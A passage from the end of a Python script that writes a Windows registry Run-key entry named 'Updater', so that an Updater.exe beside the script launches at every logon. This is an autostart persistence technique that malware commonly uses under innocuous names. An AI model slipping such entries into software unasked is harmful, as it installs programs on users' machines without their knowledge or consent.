    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")}"')
    winreg.CloseKey(key)

if __name__ == '__main__':
    main()
